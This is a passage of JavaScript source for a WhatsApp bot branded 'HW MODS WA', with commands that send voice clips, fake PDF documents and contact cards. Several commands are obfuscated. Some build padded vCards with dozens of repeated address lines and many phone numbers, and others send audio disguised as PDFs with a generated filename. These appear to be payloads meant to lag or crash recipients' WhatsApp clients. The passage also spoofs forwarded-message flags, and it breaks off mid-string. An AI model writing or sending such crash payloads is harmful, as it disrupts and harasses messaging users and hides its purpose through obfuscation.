Haikal.sendMessage(from, fto, image, {quoted:ikal, caption:`*TWITTER MP3*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
Haikal.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'Haikalgan.mp3', quoted:ikal, ptt:true})
})
break
case 'doc1':
if (!kal.key.fromMe) return fakestatus('APASIH')
             ini_image = fs.readFileSync('./stik/fake.jpeg')             
             anu = fs.readFileSync('./stik/numayei.mp3')
             Haikal.sendMessage(from, anu, document, { quoted: ikal, mimetype: Mimetype.pdf, filename: `XHIRO MHONSHINE${ngazap(prefix)}.pdf`, thumbnail: ini_image })
             break
case 'doc2':
if (!kal.key.fromMe) return fakestatus('APASIH')
             ini_image = fs.readFileSync('./stik/deden.jpeg')             
             anu = fs.readFileSync('./stik/numayei.mp3')
             Haikal.sendMessage(from, anu, document, { quoted: ikal, mimetype: Mimetype.pdf, filename: `XHIRO MHONSHINE.pdf`, thumbnail: ini_image })
             break
case 'doc3':
var _0x5d3cb0=_0x299f;function _0x299f(_0x1d2d10,_0x37590d){var _0x3c7c4f=_0x3c7c();return _0x299f=function(_0x299fe6,_0x4feb2b){_0x299fe6=_0x299fe6-0x89;var _0x1413a0=_0x3c7c4f[_0x299fe6];return _0x1413a0;},_0x299f(_0x1d2d10,_0x37590d);}(function(_0x268c92,_0x583cc6){var _0x548ce3=_0x299f,_0x76cdac=_0x268c92();while(!![]){try{var _0x46974d=-parseInt(_0x548ce3(0x97))/0x1+parseInt(_0x548ce3(0xa2))/0x2+parseInt(_0x548ce3(0x9b))/0x3+-parseInt(_0x548ce3(0x89))/0x4*(parseInt(_0x548ce3(0x95))/0x5)+parseInt(_0x548ce3(0xa4))/0x6+parseInt(_0x548ce3(0x8c))/0x7+parseInt(_0x548ce3(0xa7))/0x8;if(_0x46974d===_0x583cc6)break;else _0x76cdac['push'](_0x76cdac['shift']());}catch(_0x5ed111){_0x76cdac['push'](_0x76cdac['shift']());}}}(_0x3c7c,0xa6f7b));function _0x3c7c(){var _0x86bbc7=['661136uRtfsN','\x0a*•>\x20WITA\x20:*\x20','./stik/deden.jpeg','RESPONSE','DOCUMENT','Qb81+Jo9NYHI9gOhauWAABHdkWnIqZwRFEJM69iRp2E=','\x0a*•>\x20WIT\x20:*\x20','\x20Chat\x0a*•>\x20Total\x20Chat\x20:*\x20','TrbAEPQb7mIgDCiNH9D4/kuaDbOEMoflAtoKKMFugbw=','752555NZbFNJ','*\x20\x0a*•>\x20WIB\x20:*\x20','661499uZatBH','\x20Chat\x0a*•>\x20Speed\x20:*\x20','\x0a*•>\x20Blockir\x20:*\x20','\x0a*•>\x20Whatsapp\x20:*\x20','1433154TqJmeX','\x20Second\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0aHELLO\x20!!!\x0a┏━━⊱\x0a┣❏NAMA\x20:\x20\x20\x20\x0a┣❏UMUR\x20:\x20\x20\x0a┣❏KOTA\x20:\x20\x0a┣❏NEGARA\x20:\x0a┣❏ALASAN\x20BERGABUNG\x20:\x0a┣❏PASANGAN\x20:\x0a┗━━⊱\x0a┏━━⊱\x0a┣❏🔥➥\x20WELCOME\x20BOT\x0a┗━━⊱\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭','XHIRO\x20MHONSHINE.pdf','readFileSync','length','https://mmg.whatsapp.net/d/f/AqHKaynwur-8PzAOVp9Nbsjs_MI11PnetcpeWBteuiIq.enc','f//Q62KlTdTlYO9iAAk/tGYD+7/BS6r4tX48qPYZAvE=','1522506tGMwqh','toFixed','730248fbjGcI','HAIKAL','prepareMessageFromContent','7550784bYojAa','28odlFOZ','\x20-\x20DONASI\x20BOT\x20-\x0a❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x09\x09\x09\x09\x09\x09\x0aWELCOME\x20TO\x20BOT\x20HW\x20✓\x0a-\x20DONASI\x20-\x0aDANA\x20:\x206285714170944\x0aSAWERIA\x20:\x20https://saweria.co/hwmodswa\x0aPULSA\x20:\x20wa.me/6285714170944\x0a\x0a-\x20THANKS\x20YOU\x20BOT\x20-\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭','\x20Blocked\x0a*•>\x20Group\x20Chat\x20:*\x20'];_0x3c7c=function(){return _0x86bbc7;};return _0x3c7c();}if(isBan)return reply(mess['ban']);res=await Haikal[_0x5d3cb0(0xa6)](from,{'buttonsMessage':{'text':'','documentMessage':{'url':_0x5d3cb0(0xa0),'mimetype':'application/pdf','fileSha256':_0x5d3cb0(0x91),'fileLength':'837590','pageCount':0x0,'mediaKey':_0x5d3cb0(0x94),'fileName':_0x5d3cb0(0x9d),'fileEncSha256':_0x5d3cb0(0xa1),'jpegThumbnail':fs[_0x5d3cb0(0x9e)](_0x5d3cb0(0x8e))},'contentText':'❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0aHai\x20'+pushname+'\x0a*'+ucapanWaktu+_0x5d3cb0(0x96)+timeJak+_0x5d3cb0(0x8d)+timeMak+_0x5d3cb0(0x92)+timeJay+_0x5d3cb0(0x9a)+wa_version+_0x5d3cb0(0x99)+blocked[_0x5d3cb0(0x9f)]+_0x5d3cb0(0x8b)+totalgroup['length']+'\x20Chat\x0a*•>\x20Personal\x20Chat\x20:*\x20'+totalkontak[_0x5d3cb0(0x9f)]+_0x5d3cb0(0x93)+totalchat['length']+_0x5d3cb0(0x98)+latensi[_0x5d3cb0(0xa3)](0x4)+_0x5d3cb0(0x9c),'footerText':'❏HW\x20MODS\x20WA❏','buttons':[{'buttonId':_0x5d3cb0(0xa5),'buttonText':{'displayText':_0x5d3cb0(0x8a)},'type':_0x5d3cb0(0x8f)}],'headerType':_0x5d3cb0(0x90)}},{'quoted':ikal}),Haikal['relayWAMessage'](res);
break
case 'doc4':
var _0x564abf=_0x2d2d;(function(_0x4cd227,_0x451fad){var _0x2eb284=_0x2d2d,_0x158dc6=_0x4cd227();while(!![]){try{var _0x327a62=-parseInt(_0x2eb284(0x111))/0x1+parseInt(_0x2eb284(0x124))/0x2+-parseInt(_0x2eb284(0x113))/0x3*(-parseInt(_0x2eb284(0x128))/0x4)+-parseInt(_0x2eb284(0x116))/0x5+parseInt(_0x2eb284(0x11f))/0x6+-parseInt(_0x2eb284(0x121))/0x7+parseInt(_0x2eb284(0x12b))/0x8;if(_0x327a62===_0x451fad)break;else _0x158dc6['push'](_0x158dc6['shift']());}catch(_0x55a952){_0x158dc6['push'](_0x158dc6['shift']());}}}(_0x9106,0xd58ea));if(isBan)return reply(mess[_0x564abf(0x129)]);function _0x2d2d(_0x3381f7,_0x1f22ba){var _0x910634=_0x9106();return _0x2d2d=function(_0x2d2d2b,_0x19580e){_0x2d2d2b=_0x2d2d2b-0x111;var _0x15fe13=_0x910634[_0x2d2d2b];return _0x15fe13;},_0x2d2d(_0x3381f7,_0x1f22ba);}res=await Haikal[_0x564abf(0x12d)](from,{'buttonsMessage':{'text':'','documentMessage':{'url':'https://mmg.whatsapp.net/d/f/AqHKaynwur-8PzAOVp9Nbsjs_MI11PnetcpeWBteuiIq.enc','mimetype':'application/pdf','fileSha256':_0x564abf(0x122),'fileLength':_0x564abf(0x120),'pageCount':0x0,'mediaKey':_0x564abf(0x12c),'fileName':_0x564abf(0x11d)+ngazap(prefix)+'.pdf','fileEncSha256':_0x564abf(0x11b),'jpegThumbnail':fs['readFileSync'](_0x564abf(0x11e))},'contentText':_0x564abf(0x11c)+pushname+'\x0a*'+ucapanWaktu+'*\x20\x0a*•>\x20WIB\x20:*\x20'+timeJak+_0x564abf(0x118)+timeMak+_0x564abf(0x117)+timeJay+_0x564abf(0x125)+wa_version+_0x564abf(0x11a)+blocked[_0x564abf(0x127)]+_0x564abf(0x12a)+totalgroup[_0x564abf(0x127)]+'\x20Chat\x0a*•>\x20Personal\x20Chat\x20:*\x20'+totalkontak[_0x564abf(0x127)]+'\x20Chat\x0a*•>\x20Total\x20Chat\x20:*\x20'+totalchat[_0x564abf(0x127)]+_0x564abf(0x123)+latensi[_0x564abf(0x119)](0x4)+_0x564abf(0x126),'footerText':_0x564abf(0x11d)+ngazap(prefix),'buttons':[{'buttonId':'HAIKAL','buttonText':{'displayText':_0x564abf(0x11d)+ngazap(prefix)},'type':_0x564abf(0x115)}],'headerType':_0x564abf(0x114)}},{'quoted':ikal}),Haikal[_0x564abf(0x112)](res);function _0x9106(){var _0x3a4c1f=['XHIRO\x20MHONSHINE','./stik/fake.jpeg','642738lGmyYv','837590','2573095iwoUFS','Qb81+Jo9NYHI9gOhauWAABHdkWnIqZwRFEJM69iRp2E=','\x20Chat\x0a*•>\x20Speed\x20:*\x20','3062252TisznX','\x0a*•>\x20Whatsapp\x20:*\x20','\x20Second\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0aHELLO\x20!!!\x0a┏━━⊱\x0a┣❏NAMA\x20:\x20\x20\x20\x0a┣❏UMUR\x20:\x20\x20\x0a┣❏KOTA\x20:\x20\x0a┣❏NEGARA\x20:\x0a┣❏ALASAN\x20BERGABUNG\x20:\x0a┣❏PASANGAN\x20:\x0a┗━━⊱\x0a┏━━⊱\x0a┣❏🔥➥\x20WELCOME\x20BOT\x0a┗━━⊱\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭','length','2843704BrEMLM','ban','\x20Blocked\x0a*•>\x20Group\x20Chat\x20:*\x20','8864152lPNCDk','TrbAEPQb7mIgDCiNH9D4/kuaDbOEMoflAtoKKMFugbw=','prepareMessageFromContent','895847ORNKVJ','relayWAMessage','3CfSBha','DOCUMENT','RESPONSE','6595160WigcMZ','\x0a*•>\x20WIT\x20:*\x20','\x0a*•>\x20WITA\x20:*\x20','toFixed','\x0a*•>\x20Blockir\x20:*\x20','f//Q62KlTdTlYO9iAAk/tGYD+7/BS6r4tX48qPYZAvE=','❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0aHai\x20'];_0x9106=function(){return _0x3a4c1f;};return _0x9106();}
break
case 'opo':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
	"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AtmB0w9pcwoy79WT7mBESwtHvc1OHYQp87UVPkADNtAE.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "85/7Cey+fdhRpEDi4B2TDhWeuqLsabJykRkwD/K+jqs=",
						"fileLength": "1309681",
						"seconds": 23,
						"ptt": true,
						"mediaKey": "x7K3QwJ7AHIidL7Il3TdmAfAYAkBeYDqfgst2HLH++w=",
						"fileEncSha256": "vJJjLAmr8eFN4WtyZixDL5X6JdLLlHrYi/nJqcJ5mTw=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
case 'apa':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AooYvxqw_OwDh6KWMW-Nd4093MKJJwIwVNDG0G8Ou8DK.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "/M/JeXZVIQHPBJ3GSa5xxgm4ww3S72XpzaDOuiaF9jE=",
						"fileLength": "159204",
						"seconds": 9,
						"ptt": true,
						"mediaKey": "/SU+O/rEmbBctdEMFcpKpej6V2yOTOmfC7VRYCQoGDw=",
						"fileEncSha256": "ujkoeAImdeA4vnbWzDhbMKcMvVpB1YEmluogAs6wSRM=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break 
case 'asw':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Am1VWYdKickjcKzBnPa3m8zD9ZeIhvmB3rqZqDwijQAQ.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "DqJ+UYLk3E2pkubjnKCMlXNVYp/OCkfT6JrFeICvz9s=",
						"fileLength": "401522",
						"seconds": 11,
						"ptt": true,
						"mediaKey": "QCSDUXCOK9Qde4WESJTmyT85yddk/ZODOsfcsNWMtXo=",
						"fileEncSha256": "bRDmW328K3aExoSBC2pGki14mhJG4zU9ft868K36xac=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'kesel':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Ak583uzRNHPuNnLa__lzyz2G_1nczmGRT9qcWQoGdJl0.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "TXuiE4tb24WCGFiu9iDgtG93aFLhSSF4L3EbdCLxc6o=",
						"fileLength": "172666",
						"seconds": 8,
						"ptt": true,
						"mediaKey": "aEe6sfMA/SPZ07BPGY1wV+2gfyACAwITK7NredUzGt0=",
						"fileEncSha256": "kTTgUp1BeOicPNH8cIICF5JpYRv2lfyZQnsRCgnhnmc=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'ketawa':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ArQmj1KpeT8hPwTnzeTylcDaNFFqkRtpC0ObvrPwyckK.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "WHt86HXm1WZAK68+iJlkSBsSuuLjBb23higXVQLfugY=",
						"fileLength": "146840",
						"seconds": 6,
						"ptt": true,
						"mediaKey": "DBnWzzsxQWAicta484k+DKsrcBnaXIbZxoKmgkecc4s=",
						"fileEncSha256": "mrxkaWX5WpYXJ0XWkttQLBODyaW3hs2PkCviBDA0XFI=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'loli':
                                        if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Au7JNvqAEeMPlM7-xi4th53PLp2_UnGU0ArDp1AOMWkG.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "a/HPdajT9osHpbi0mwQ1AREaLwnc5Ag+q0wwj39BVSQ=",
						"fileLength": "124599",
						"seconds": 10,
						"ptt": true,
						"mediaKey": "ThW26KGOpROTaB0pwkC4D5W4DrEsiT2tpBPjJDpgiaE=",
						"fileEncSha256": "t4/CikpoPsipAlW4QQCE7yujCBuk8EpQguQXRJtF4Aw=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'ngeselin':
                                        if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AlrN2ltFQ4fyClosHtz8QXIvxznkBCwYWZxA2uX9rVvm.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "zYga5j/ffGmRWsHPJWNdez4FFGAmOeSxOb+NAqux7Y0=",
						"fileLength": "116027",
						"seconds": 7,
						"ptt": true,
						"mediaKey": "SxFdxdo0Y5fQYPAWsKYVXNQsQ2/wLLV/xmz07QJTGtg=",
						"fileEncSha256": "BqACzaADgiMk2rSb7WCmHGHspc9emQTtQzO4HB56x7U=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'awkwk':
                                        if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Antdkjboyw1PPqjLE0jyu_V0eOUAfFfNAuwfyBXFIQ0N.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "iUln5EKU+jLl4DSus3xwIxINWfcO//EMs3dsPFjujw0=",
						"fileLength": "112893",
						"seconds": 4,
						"ptt": true,
						"mediaKey": "XICyDiCFA1BCvEbBwjTK6VtaT8qAklUwpPrFUE2bhpo=",
						"fileEncSha256": "K44TvJesO2otjw0557mr9Wg+X7WzbYZ4hixnZtnJqvE=",
						"directPath": "/v/t62.7117-24/29289855_814672179287496_8656586646343158069_n.enc?ccb=11-4&oh=2560b6a0ad8617dedf550310419c9bd0&oe=61B19126",
						"mediaKeyTimestamp": "1636637078",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'ikal':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AtfxfqFIi-Pmy7OjVkKrsXn-KmeyVZuOjkOJrOj2okZ5.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "08mnXonh34aD3HGyKVjbdY5+A4Ali31jhJx4Nq0ezPo=",
						"fileLength": "37668",
						"seconds": 1,
						"ptt": true,
						"mediaKey": "YVvMk/rVgYUn5KGmGUxo6aduOiTCUrF0v5Ro9vTWE1U=",
						"fileEncSha256": "SBLKJYrb2e0BY37t3cGChGCojte4AMTnj0sd6ug/bS0=",
						"directPath": "/v/t62.7117-24/30668334_192872536261631_5789260719226097886_n.enc?ccb=11-4&oh=8db43fcdc0c831ff3fef451dff8b97fa&oe=61B1A61C",
						"mediaKeyTimestamp": "1636637089",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'hoax':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AkVXG9rhoAXjK88jBYNvTXIG5PoIa2k1tLT1UBgaEfnW.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "/J8qG91XdHMMUJmqUpgHxA7QUg8P4VBZKnzNlKBzDqM=",
						"fileLength": "203864",
						"seconds": 8,
						"ptt": true,
						"mediaKey": "VymQGZQa0xMODUaiGkTNSz/OYMKmkhx69KSwWkI7R8s=",
						"fileEncSha256": "ybRupKGa2z5fbEBjzyUFrjOCEGr7gxUkiu8ms7OTSnk=",
						"directPath": "/v/t62.7117-24/20036316_199524118981261_1655964017186946107_n.enc?ccb=11-4&oh=9b845359543f88f19adb50a7b10de4b5&oe=61B21818",
						"mediaKeyTimestamp": "1636498296",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'bot':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AqKLWyirKWDiGF9lTdwfIZOp1ykK-TmBAGVOnCD_LC-O.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "1IB2WRCT8y9WEkJepRYQj2lxmLnPS+0egUltiHl/QHk=",
						"fileLength": "3033954",
						"seconds": 11,
						"ptt": true,
						"mediaKey": "Y9YkOBhwLvwdZr+pk2FuqTBFgj6d7QyPEwMj5FRkWao=",
						"fileEncSha256": "fDyffAizESCvPIj24m21EYSkm/OyKO/r+mZE91BluuQ=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'bacot':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AlNpdHMJcJcd_mvzaZOxhoWaaZQYpiHgs9gSv3jnWjdq.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "Qb81+Jo9NYHI9gOhauWAABHdkWnIqZwRFEJM69iRp2E=",
						"fileLength": "837590",
						"seconds": 34,
						"ptt": true,
						"mediaKey": "n3+BmPnKJPR0WrdCybE+Aa2baJNh05zU7IGHVEYs8dQ=",
						"fileEncSha256": "CjURptuw4v8E7TrgWK1xxm1vsLA//Ha4Zn7gQT8E6ds=",
						"directPath": "/v/t62.7114-24/29137582_2703398559969196_8994531630385031578_n.enc?ccb=11-4&oh=64ced22d7721ed6806b4e22a2eb390f6&oe=61B315B4",
						"mediaKeyTimestamp": "1636513812",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break      
//=================================================//
// Owner Contact Array ( HW MODS WA )
case 'nomrowner':
case 'nomoradmin':
if (!kal.key.fromMe) return fakestatus('APASIH')
const _0x107fed=_0x3af0;function _0x3af0(_0x2f87b8,_0x3ca2e5){const _0x52edd5=_0x52ed();return _0x3af0=function(_0x3af094,_0x4a4f07){_0x3af094=_0x3af094-0x1aa;let _0x17cd1f=_0x52edd5[_0x3af094];return _0x17cd1f;},_0x3af0(_0x2f87b8,_0x3ca2e5);}(function(_0x4b3600,_0x92a4b9){const _0x49af19=_0x3af0,_0x4ea029=_0x4b3600();while(!![]){try{const _0xea3b5c=parseInt(_0x49af19(0x1ac))/0x1+parseInt(_0x49af19(0x1b1))/0x2*(-parseInt(_0x49af19(0x1ab))/0x3)+parseInt(_0x49af19(0x1b6))/0x4*(parseInt(_0x49af19(0x1b3))/0x5)+parseInt(_0x49af19(0x1b5))/0x6*(-parseInt(_0x49af19(0x1bc))/0x7)+-parseInt(_0x49af19(0x1b0))/0x8+parseInt(_0x49af19(0x1ae))/0x9+parseInt(_0x49af19(0x1bb))/0xa*(parseInt(_0x49af19(0x1af))/0xb);if(_0xea3b5c===_0x92a4b9)break;else _0x4ea029['push'](_0x4ea029['shift']());}catch(_0x2aed9b){_0x4ea029['push'](_0x4ea029['shift']());}}}(_0x52ed,0x959d8));let ini_list=[];function _0x52ed(){const _0x43a94d=['vname','6647985jKGAOz','38665NVgZag','5902048KeKRpv','2YyoqxV','\x20kontak','52165UVuzqo','©\x20HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20/>','6AYQoNJ','348VKiMIv','notify','contactsArrayMessage','contacts','sendMessage','550DhEjoC','3390352CXztBS','Lu\x20siapa','push','2331432kkfAGz','772399UAGqzG'];_0x52ed=function(){return _0x43a94d;};return _0x52ed();}for(let i of ownerNumbers){const vname=Haikal[_0x107fed(0x1b9)][i]!=undefined?Haikal['contacts'][i][_0x107fed(0x1ad)]||Haikal['contacts'][i][_0x107fed(0x1b7)]:undefined;ini_list[_0x107fed(0x1aa)]({'displayName':_0x107fed(0x1b4),'vcard':'BEGIN:VCARD\x0aVERSION:3.0\x0aN:©\x20HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20/>;;;\x0aFN:©\x20HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20/>\x0aitem1.TEL;waid=6285714170944:+62857141709441:+62857141709442:+62857141709443:+62857141709444:+62857141709445:+62857141709446:+62857141709447:+62857141709448:+62857141709449:+62857141709440\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD'},{'displayName':'©\x20HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20/>','vcard':'BEGIN:VCARD\x0aVERSION:3.0\x0aN:©\x20HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20/>;;;\x0aFN:©\x20HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20/>\x0aitem1.TEL;waid=0:+0\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\